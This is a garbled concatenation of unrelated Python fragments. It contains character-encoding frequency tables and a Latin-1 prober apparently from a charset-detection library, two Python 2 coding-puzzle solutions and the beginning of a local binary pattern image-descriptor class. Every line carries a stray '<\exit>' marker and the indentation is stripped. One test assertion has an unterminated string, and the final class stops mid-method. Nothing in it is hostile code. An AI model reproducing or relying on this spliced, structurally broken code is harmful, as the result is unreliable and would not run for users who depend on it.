0,1,1,1,1,1,1,1,1,2,0,1,1,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,1,1,1,1,0,0,2,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,<\exit>
0,1,1,1,1,1,1,0,1,1,0,1,0,1,1,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,1,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
0,1,1,1,1,1,0,0,1,1,0,1,0,1,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,0,0,1,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,1,1,1,0,1,0,0,1,1,0,1,0,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
2,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,0,1,0,0,1,0,1,0,1,1,1,0,0,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,1,1,1,0,0,0,1,1,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,1,1,1,1,1,1,0,1,1,0,1,0,1,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,<\exit>
)<\exit>
Latin2HungarianModel = {<\exit>
'charToOrderMap': Latin2_HungarianCharToOrderMap,<\exit>
'precedenceMatrix': HungarianLangModel,<\exit>
'mTypicalPositiveRatio': 0.947368,<\exit>
'keepEnglishLetter': True,<\exit>
'charsetName': "ISO-8859-2"<\exit>
}<\exit>
Win1250HungarianModel = {<\exit>
'charToOrderMap': win1250HungarianCharToOrderMap,<\exit>
'precedenceMatrix': HungarianLangModel,<\exit>
'mTypicalPositiveRatio': 0.947368,<\exit>
'keepEnglishLetter': True,<\exit>
'charsetName': "windows-1250"<\exit>
}<\exit>
TIS620CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,182,106,107,100,183,184,185,101, 94,186,187,108,109,110,111,<\exit>
188,189,190, 89, 95,112,113,191,192,193,194,253,253,253,253,253,<\exit>
253, 64, 72, 73,114, 74,115,116,102, 81,201,117, 90,103, 78, 82,<\exit>
96,202, 91, 79, 84,104,105, 97, 98, 92,203,253,253,253,253,253,<\exit>
209,210,211,212,213, 88,214,215,216,217,218,219,220,118,221,222,<\exit>
223,224, 99, 85, 83,225,226,227,228,229,230,231,232,233,234,235,<\exit>
236,  5, 30,237, 24,238, 75,  8, 26, 52, 34, 51,119, 47, 58, 57,<\exit>
49, 53, 55, 43, 20, 19, 44, 14, 48,  3, 17, 25, 39, 62, 31, 54,<\exit>
45,  9, 16,  2, 61, 15,239, 12, 42, 46, 18, 21, 76,  4, 66, 63,<\exit>
22, 10,  1, 36, 23, 13, 40, 27, 32, 35, 86,240,241,242,243,244,<\exit>
11, 28, 41, 29, 33,245, 50, 37,  6,  7, 67, 77, 38, 93,246,247,<\exit>
68, 56, 59, 65, 69, 60, 70, 80, 71, 87,248,249,250,251,252,253,<\exit>
)<\exit>
ThaiLangModel = (<\exit>
0,1,3,3,3,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,0,0,3,3,3,0,3,3,3,3,<\exit>
0,3,3,0,0,0,1,3,0,3,3,2,3,3,0,1,2,3,3,3,3,0,2,0,2,0,0,3,2,1,2,2,<\exit>
3,0,3,3,2,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,0,3,2,3,0,2,2,2,3,<\exit>
0,2,3,0,0,0,0,1,0,1,2,3,1,1,3,2,2,0,1,1,0,0,1,0,0,0,0,0,0,0,1,1,<\exit>
3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,3,3,2,3,2,3,3,2,2,2,<\exit>
3,1,2,3,0,3,3,2,2,1,2,3,3,1,2,0,1,3,0,1,0,0,1,0,0,0,0,0,0,0,1,1,<\exit>
3,3,2,2,3,3,3,3,1,2,3,3,3,3,3,2,2,2,2,3,3,2,2,3,3,2,2,3,2,3,2,2,<\exit>
3,3,1,2,3,1,2,2,3,3,1,0,2,1,0,0,3,1,2,1,0,0,1,0,0,0,0,0,0,1,0,1,<\exit>
3,3,3,3,3,3,2,2,3,3,3,3,2,3,2,2,3,3,2,2,3,2,2,2,2,1,1,3,1,2,1,1,<\exit>
3,2,1,0,2,1,0,1,0,1,1,0,1,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,2,3,2,3,3,2,2,3,2,3,3,2,3,1,1,2,3,2,2,2,3,2,2,2,2,2,1,2,1,<\exit>
2,2,1,1,3,3,2,1,0,1,2,2,0,1,3,0,0,0,1,1,0,0,0,0,0,2,3,0,0,2,1,1,<\exit>
3,3,2,3,3,2,0,0,3,3,0,3,3,0,2,2,3,1,2,2,1,1,1,0,2,2,2,0,2,2,1,1,<\exit>
0,2,1,0,2,0,0,2,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,2,3,3,2,0,0,3,3,0,2,3,0,2,1,2,2,2,2,1,2,0,0,2,2,2,0,2,2,1,1,<\exit>
0,2,1,0,2,0,0,2,0,1,1,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,3,2,3,2,3,2,0,2,2,1,3,2,1,3,2,1,2,3,2,2,3,0,2,3,2,2,1,2,2,2,2,<\exit>
1,2,2,0,0,0,0,2,0,1,2,0,1,1,1,0,1,0,3,1,1,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,2,3,3,2,3,2,2,2,3,2,2,3,2,2,1,2,3,2,2,3,1,3,2,2,2,3,2,2,2,3,<\exit>
3,2,1,3,0,1,1,1,0,2,1,1,1,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0,2,0,0,<\exit>
1,0,0,3,0,3,3,3,3,3,0,0,3,0,2,2,3,3,3,3,3,0,0,0,1,1,3,0,0,0,0,2,<\exit>
0,0,1,0,0,0,0,0,0,0,2,3,0,0,0,3,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,<\exit>
2,0,3,3,3,3,0,0,2,3,0,0,3,0,3,3,2,3,3,3,3,3,0,0,3,3,3,0,0,0,3,3,<\exit>
0,0,3,0,0,0,0,2,0,0,2,1,1,3,0,0,1,0,0,2,3,0,1,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,2,3,3,3,3,3,3,3,1,2,1,3,3,2,2,1,2,2,2,3,1,1,2,0,2,1,2,1,<\exit>
2,2,1,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,0,2,1,2,3,3,3,0,2,0,2,2,0,2,1,3,2,2,1,2,1,0,0,2,2,1,0,2,1,2,2,<\exit>
0,1,1,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,2,1,3,3,1,1,3,0,2,3,1,1,3,2,1,1,2,0,2,2,3,2,1,1,1,1,1,2,<\exit>
3,0,0,1,3,1,2,1,2,0,3,0,0,0,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,<\exit>
3,3,1,1,3,2,3,3,3,1,3,2,1,3,2,1,3,2,2,2,2,1,3,3,1,2,1,3,1,2,3,0,<\exit>
2,1,1,3,2,2,2,1,2,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,<\exit>
3,3,2,3,2,3,3,2,3,2,3,2,3,3,2,1,0,3,2,2,2,1,2,2,2,1,2,2,1,2,1,1,<\exit>
2,2,2,3,0,1,3,1,1,1,1,0,1,1,0,2,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,2,3,2,2,1,1,3,2,3,2,3,2,0,3,2,2,1,2,0,2,2,2,1,2,2,2,2,1,<\exit>
3,2,1,2,2,1,0,2,0,1,0,0,1,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,1,<\exit>
3,3,3,3,3,2,3,1,2,3,3,2,2,3,0,1,1,2,0,3,3,2,2,3,0,1,1,3,0,0,0,0,<\exit>
3,1,0,3,3,0,2,0,2,1,0,0,3,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,2,3,2,3,3,0,1,3,1,1,2,1,2,1,1,3,1,1,0,2,3,1,1,1,1,1,1,1,1,<\exit>
3,1,1,2,2,2,2,1,1,1,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,2,2,1,1,2,1,3,3,2,3,2,2,3,2,2,3,1,2,2,1,2,0,3,2,1,2,2,2,2,2,1,<\exit>
3,2,1,2,2,2,1,1,1,1,0,0,1,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,1,3,3,0,2,1,0,3,2,0,0,3,1,0,1,1,0,1,0,0,0,0,0,1,<\exit>
1,0,0,1,0,3,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,2,2,2,3,0,0,1,3,0,3,2,0,3,2,2,3,3,3,3,3,1,0,2,2,2,0,2,2,1,2,<\exit>
0,2,3,0,0,0,0,1,0,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
3,0,2,3,1,3,3,2,3,3,0,3,3,0,3,2,2,3,2,3,3,3,0,0,2,2,3,0,1,1,1,3,<\exit>
0,0,3,0,0,0,2,2,0,1,3,0,1,2,2,2,3,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,<\exit>
3,2,3,3,2,0,3,3,2,2,3,1,3,2,1,3,2,0,1,2,2,0,2,3,2,1,0,3,0,0,0,0,<\exit>
3,0,0,2,3,1,3,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,3,2,2,2,1,2,0,1,3,1,1,3,1,3,0,0,2,1,1,1,1,2,1,1,1,0,2,1,0,1,<\exit>
1,2,0,0,0,3,1,1,0,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,0,3,1,0,0,0,1,0,<\exit>
3,3,3,3,2,2,2,2,2,1,3,1,1,1,2,0,1,1,2,1,2,1,3,2,0,0,3,1,1,1,1,1,<\exit>
3,1,0,2,3,0,0,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,2,3,0,3,3,0,2,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,2,3,1,3,0,0,1,2,0,0,2,0,3,3,2,3,3,3,2,3,0,0,2,2,2,0,0,0,2,2,<\exit>
0,0,1,0,0,0,0,3,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,1,2,3,1,3,3,0,0,1,0,3,0,0,0,0,0,<\exit>
0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,1,2,3,1,2,3,1,0,3,0,2,2,1,0,2,1,1,2,0,1,0,0,1,1,1,1,0,1,0,0,<\exit>
1,0,0,0,0,1,1,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,2,1,0,1,1,1,3,1,2,2,2,2,2,2,1,1,1,1,0,3,1,0,1,3,1,1,1,1,<\exit>
1,1,0,2,0,1,3,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,<\exit>
3,0,2,2,1,3,3,2,3,3,0,1,1,0,2,2,1,2,1,3,3,1,0,0,3,2,0,0,0,0,2,1,<\exit>
0,1,0,0,0,0,1,2,0,1,1,3,1,1,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,0,3,0,0,1,0,0,0,3,0,0,3,0,3,1,0,1,1,1,3,2,0,0,0,3,0,0,0,0,2,0,<\exit>
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,3,1,3,2,1,3,3,1,2,2,0,1,2,1,0,1,2,0,0,0,0,0,3,0,0,0,3,0,0,0,0,<\exit>
3,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,1,2,0,3,3,3,2,2,0,1,1,0,1,3,0,0,0,2,2,0,0,0,0,3,1,0,1,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,2,3,1,2,0,0,2,1,0,3,1,0,1,2,0,1,1,1,1,3,0,0,3,1,1,0,2,2,1,1,<\exit>
0,2,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,0,3,1,2,0,0,2,2,0,1,2,0,1,0,1,3,1,2,1,0,0,0,2,0,3,0,0,0,1,0,<\exit>
0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,1,1,2,2,0,0,0,2,0,2,1,0,1,1,0,1,1,1,2,1,0,0,1,1,1,0,2,1,1,1,<\exit>
0,1,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,1,<\exit>
0,0,0,2,0,1,3,1,1,1,1,0,0,0,0,3,2,0,1,0,0,0,1,2,0,0,0,1,0,0,0,0,<\exit>
0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,2,3,2,2,0,0,0,1,0,0,0,0,2,3,2,1,2,2,3,0,0,0,2,3,1,0,0,0,1,1,<\exit>
0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,3,2,2,0,1,0,0,0,0,2,0,2,0,1,0,0,0,1,1,0,0,0,2,1,0,1,0,1,1,0,0,<\exit>
0,1,0,2,0,0,1,0,3,0,1,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,1,0,0,1,0,0,0,0,0,1,1,2,0,0,0,0,1,0,0,1,3,1,0,0,0,0,1,1,0,0,<\exit>
0,1,0,0,0,0,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,1,1,1,1,2,3,0,0,2,1,1,1,1,1,0,2,1,1,0,0,0,2,1,0,1,2,1,1,0,1,<\exit>
2,1,0,3,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,3,1,0,0,0,0,0,0,0,3,0,0,0,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,<\exit>
0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,2,0,0,0,0,0,0,1,2,1,0,1,1,0,2,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,2,0,0,0,1,3,0,1,0,0,0,2,0,0,0,0,0,0,0,1,2,0,0,0,0,0,<\exit>
3,3,0,0,1,1,2,0,0,1,2,1,0,1,1,1,0,1,1,0,0,2,1,1,0,1,0,0,1,1,1,0,<\exit>
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,1,0,0,0,0,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,0,0,1,1,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,1,0,1,2,0,1,2,0,0,1,1,0,2,0,1,0,0,1,0,0,0,0,1,0,0,0,2,0,0,0,0,<\exit>
1,0,0,1,0,1,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,1,0,0,0,0,0,0,0,1,1,0,1,1,0,2,1,3,0,0,0,0,1,1,0,0,0,0,0,0,0,3,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,1,0,1,0,0,2,0,0,2,0,0,1,1,2,0,0,1,1,0,0,0,1,0,0,0,1,1,0,0,0,<\exit>
1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,3,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,0,1,0,0,0,0,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,1,1,0,0,2,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
)<\exit>
TIS620ThaiModel = {<\exit>
'charToOrderMap': TIS620CharToOrderMap,<\exit>
'precedenceMatrix': ThaiLangModel,<\exit>
'mTypicalPositiveRatio': 0.926386,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "TIS-620"<\exit>
}<\exit>
class Solution:<\exit>
def largestNumber(self, nums):<\exit>
nums = map(str, nums)<\exit>
nums.sort(cmp=self.cmp, reverse=True)<\exit>
nums = "".join(nums)<\exit>
nums = nums.lstrip("0")<\exit>
if not nums:<\exit>
nums = "0"<\exit>
return nums<\exit>
def cmp(self, a, b):<\exit>
order = 1<\exit>
if len(a) > len(b):<\exit>
order = -1<\exit>
a, b = b, a<\exit>
for i in xrange(len(a)):<\exit>
if int(a[i]) != int(b[i]):<\exit>
return order*(int(a[i])-int(b[i]))<\exit>
if len(a) == len(b):<\exit>
return 0<\exit>
return order*self.cmp(a, b[len(a):])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().largestNumber([0, 0]) == "0"<\exit>
assert Solution().largestNumber([1, 20, 23, 4, 8]) == "8423201<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, lst = cipher<\exit>
for i in xrange(len(lst)):<\exit>
if K <= 0:<\exit>
break<\exit>
maxa, idx = -1, 0<\exit>
for j in xrange(i, len(lst)):<\exit>
if lst[j] > maxa:<\exit>
maxa = lst[j]<\exit>
idx = j<\exit>
if idx != i:<\exit>
K -= 1<\exit>
lst[idx], lst[i] = lst[i], lst[idx]<\exit>
return " ".join(map(str, lst))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N, K = map(int, f.readline().strip().split(' '))<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = (N, K, lst)<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from .charsetprober import CharSetProber<\exit>
from .constants import eNotMe<\exit>
from .compat import wrap_ord<\exit>
FREQ_CAT_NUM = 4<\exit>
UDF = 0<\exit>
OTH = 1<\exit>
ASC = 2<\exit>
ASS = 3<\exit>
ACV = 4<\exit>
ACO = 5<\exit>
ASV = 6<\exit>
ASO = 7<\exit>
CLASS_NUM = 8<\exit>
Latin1_CharToClass = (<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, ASC, ASC, ASC, ASC, ASC, ASC, ASC,<\exit>
ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,<\exit>
ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,<\exit>
ASC, ASC, ASC, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, ASS, ASS, ASS, ASS, ASS, ASS, ASS,<\exit>
ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,<\exit>
ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,<\exit>
ASS, ASS, ASS, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, UDF, OTH, ASO, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, ACO, OTH, ACO, UDF, ACO, UDF,<\exit>
UDF, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, ASO, OTH, ASO, UDF, ASO, ACO,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,<\exit>
ACV, ACV, ACV, ACV, ACV, ACV, ACO, ACO,<\exit>
ACV, ACV, ACV, ACV, ACV, ACV, ACV, ACV,<\exit>
ACO, ACO, ACV, ACV, ACV, ACV, ACV, OTH,<\exit>
ACV, ACV, ACV, ACV, ACV, ACO, ACO, ACO,<\exit>
ASV, ASV, ASV, ASV, ASV, ASV, ASO, ASO,<\exit>
ASV, ASV, ASV, ASV, ASV, ASV, ASV, ASV,<\exit>
ASO, ASO, ASV, ASV, ASV, ASV, ASV, OTH,<\exit>
ASV, ASV, ASV, ASV, ASV, ASO, ASO, ASO,<\exit>
)<\exit>
Latin1ClassModel = (<\exit>
0,  0,  0,  0,  0,  0,  0,  0,<\exit>
0,  3,  3,  3,  3,  3,  3,  3,<\exit>
0,  3,  3,  3,  3,  3,  3,  3,<\exit>
0,  3,  3,  3,  1,  1,  3,  3,<\exit>
0,  3,  3,  3,  1,  2,  1,  2,<\exit>
0,  3,  3,  3,  3,  3,  3,  3,<\exit>
0,  3,  1,  3,  1,  1,  1,  3,<\exit>
0,  3,  1,  3,  1,  1,  3,  3,<\exit>
)<\exit>
class Latin1Prober(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self._mLastCharClass = OTH<\exit>
self._mFreqCounter = [0] * FREQ_CAT_NUM<\exit>
CharSetProber.reset(self)<\exit>
def get_charset_name(self):<\exit>
return "windows-1252"<\exit>
def feed(self, aBuf):<\exit>
aBuf = self.filter_with_english_letters(aBuf)<\exit>
for c in aBuf:<\exit>
charClass = Latin1_CharToClass[wrap_ord(c)]<\exit>
freq = Latin1ClassModel[(self._mLastCharClass * CLASS_NUM)<\exit>
+ charClass]<\exit>
if freq == 0:<\exit>
self._mState = eNotMe<\exit>
break<\exit>
self._mFreqCounter[freq] += 1<\exit>
self._mLastCharClass = charClass<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
if self.get_state() == eNotMe:<\exit>
return 0.01<\exit>
total = sum(self._mFreqCounter)<\exit>
if total < 0.01:<\exit>
confidence = 0.0<\exit>
else:<\exit>
confidence = ((self._mFreqCounter[3] / total)<\exit>
- (self._mFreqCounter[1] * 20.0 / total))<\exit>
if confidence < 0.0:<\exit>
confidence = 0.0<\exit>
confidence = confidence * 0.5<\exit>
return confidence<\exit>
import numpy as np<\exit>
from scipy.signal import convolve2d<\exit>
class LocalDescriptor(object):<\exit>
def __init__(self, neighbors):<\exit>
self._neighbors = neighbors<\exit>
def __call__(self,X):<\exit>
raise NotImplementedError("Every LBPOperator must implement the __call__ method.")<\exit>
@property<\exit>
def neighbors(self):<\exit>
return self._neighbors<\exit>
def __repr__(self):<\exit>
return "LBPOperator (neighbors=%s)" % self._neighbors<\exit>
def short_name(self):<\exit>
return "LBPOperator"<\exit>
class OriginalLBP(LocalDescriptor):<\exit>
def __init__(self):<\exit>
LocalDescriptor.__init__(self, 8)<\exit>
def __call__(self, X):<\exit>
X = np.asarray(X)<\exit>
X = (1<<7) * (X[0:-2,0:-2] >= X[1:-1,1:-1]) \<\exit>
+ (1<<6) * (X[0:-2,1:-1] >= X[1:-1,1:-1]) \<\exit>
+ (1<<5) * (X[0:-2,2:] >= X[1:-1,1:-1]) \<\exit>
+ (1<<4) * (X[1:-1,2:] >= X[1:-1,1:-1]) \<\exit>
+ (1<<3) * (X[2:,2:] >= X[1:-1,1:-1]) \<\exit>
+ (1<<2) * (X[2:,1:-1] >= X[1:-1,1:-1]) \<\exit>
+ (1<<1) * (X[2:,:-2] >= X[1:-1,1:-1]) \<\exit>
+ (1<<0) * (X[1:-1,:-2] >= X[1:-1,1:-1])<\exit>
return X<\exit>
def __repr__(self):<\exit>
return "OriginalLBP (neighbors=%s)" % self._neighbors<\exit>
def short_name(self):<\exit>
return "OriginalLBP"<\exit>
class ExtendedLBP(LocalDescriptor):<\exit>
def __init__(self, radius=1, neighbors=8):<\exit>
LocalDescriptor.__init__(self, neighbors)<\exit>
self._radius = radius<\exit>
def __call__(self, X):<\exit>
X = np.asanyarray(X)<\exit>
ysize, xsize = X.shape<\exit>
angles = 2*np.pi/self._neighbors<\exit>
theta = np.arange(0, 2*np.pi, angles)<\exit>
